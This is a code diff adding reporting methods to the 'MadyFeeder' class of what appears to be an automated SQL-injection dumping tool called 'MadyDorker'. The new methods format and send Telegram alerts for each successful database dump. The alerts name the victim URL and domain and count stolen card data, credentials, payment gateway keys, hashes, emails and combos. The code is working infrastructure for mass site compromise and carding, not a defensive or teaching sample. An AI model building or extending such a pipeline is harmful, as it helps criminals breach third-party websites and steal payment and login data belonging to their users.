@@ -423,6 +423,125 @@ class MadyFeeder:
         
         return "\n".join(lines)
     
+    def _build_dump_message(self, url: str, dbms: str, database: str,
+                            tables: int, rows: int, cards: int = 0,
+                            credentials: int = 0, gateway_keys: int = 0,
+                            dump_type: str = "union", source: str = "auto_dump",
+                            extra: Optional[Dict] = None) -> str:
+        """Build a rich HTML message for a successful data dump."""
+        try:
+            from urllib.parse import urlparse
+            domain = urlparse(url).netloc or url[:60]
+        except Exception:
+            domain = url[:60]
+        
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        
+        # Dump type emoji
+        type_info = {
+            'union': ('⚡', 'Union-Based'),
+            'boolean': ('🔮', 'Boolean Blind'),
+            'time': ('⏱️', 'Time-Based Blind'),
+            'error': ('💥', 'Error-Based'),
+            'blind': ('🔮', 'Blind'),
+        }
+        emoji, label = type_info.get(dump_type, ('📦', dump_type.title()))
+        
+        lines = [
+            f"📦 <b>DATA DUMP SUCCESSFUL</b> 📦",
+            "",
+            f"{emoji} <b>Type:</b> {label} SQLi",
+            f"🗄️ <b>DBMS:</b> <code>{dbms or 'Unknown'}</code>",
+            f"🗃️ <b>Database:</b> <code>{database or 'N/A'}</code>",
+            f"🌐 <b>Domain:</b> <code>{domain}</code>",
+            f"🔗 <b>URL:</b> {url[:200]}",
+            "",
+            f"📊 <b>Tables:</b> {tables}",
+            f"📝 <b>Rows:</b> {rows:,}",
+        ]
+        
+        # High-value data indicators
+        if cards > 0:
+            lines.append(f"💳 <b>Card Data:</b> {cards} entries")
+        if credentials > 0:
+            lines.append(f"🔐 <b>Credentials:</b> {credentials}")
+        if gateway_keys > 0:
+            lines.append(f"🔑 <b>Gateway Keys:</b> {gateway_keys}")
+        
+        # Extra metadata
+        if extra:
+            if 'hashes' in extra and extra['hashes'] > 0:
+                lines.append(f"#️⃣ <b>Hashes:</b> {extra['hashes']}")
+            if 'emails' in extra and extra['emails'] > 0:
+                lines.append(f"📧 <b>Emails:</b> {extra['emails']}")
+            if 'combos' in extra and extra['combos'] > 0:
+                lines.append(f"🔗 <b>Combos:</b> {extra['combos']}")
+            if 'files' in extra:
+                lines.append(f"📄 <b>Files:</b> {len(extra['files']) if isinstance(extra['files'], list) else extra['files']}")
+        
+        # Source label
+        source_labels = {
+            'auto_dump': '🤖 Auto-Dump Pipeline',
+            'scan_sqli_dump': '💉 /scan SQLi Dump',
+            'scan_blind_dump': '🔮 /scan Blind Dump',
+            'legacy_union': '⚡ Legacy Union Dump',
+            'legacy_blind': '🔮 Legacy Blind Dump',
+        }
+        src_label = source_labels.get(source, f'📡 {source}')
+        lines.append(f"")
+        lines.append(f"📡 <b>Source:</b> {src_label}")
+        
+        lines.extend([
+            "",
+            f"⏰ {timestamp}",
+            f"━━━━━━━━━━━━━━━━━━━━",
+            f"🤖 <b>MadyDorker Auto-Feed</b>",
+        ])
+        
+        return "\n".join(lines)
+    
+    def feed_dump(self, url: str, dbms: str, database: str,
+                  tables: int, rows: int, cards: int = 0,
+                  credentials: int = 0, gateway_keys: int = 0,
+                  dump_type: str = "union", source: str = "auto_dump",
+                  extra: Optional[Dict] = None) -> bool:
+        """Feed a dump report to Mady via Telegram + disk log."""
+        if not self.config.enabled or not self.config.telegram_enabled:
+            return False
+        
+        try:
+            msg = self._build_dump_message(
+                url, dbms, database, tables, rows, cards,
+                credentials, gateway_keys, dump_type, source, extra,
+            )
+            self._send_telegram_sync(msg)
+            logger.info(f"📦 Fed dump to Mady: {dbms}/{database} {tables}T/{rows}R from {url[:50]}")
+            return True
+        except Exception as e:
+            logger.error(f"Failed to feed dump to Mady: {e}")
+            return False
+    
+    async def feed_dump_async(self, url: str, dbms: str, database: str,
+                               tables: int, rows: int, cards: int = 0,
+                               credentials: int = 0, gateway_keys: int = 0,
+                               dump_type: str = "union", source: str = "auto_dump",
+                               extra: Optional[Dict] = None) -> bool:
+        """Async version of feed_dump."""
+        if not self.config.enabled or not self.config.telegram_enabled:
+            return False
+        
+        try:
+            msg = self._build_dump_message(
+                url, dbms, database, tables, rows, cards,
+                credentials, gateway_keys, dump_type, source, extra,
+            )
+            await self._send_telegram(msg)
+            logger.info(f"📦 Fed dump to Mady: {dbms}/{database} {tables}T/{rows}R from {url[:50]}")
+            return True
+        except Exception as e:
+            logger.error(f"Failed to feed dump to Mady: {e}")
+            return False
+    
     async def _send_telegram(self, text: str) -> int:
         """Send rich message to ALL configured Telegram targets.
         
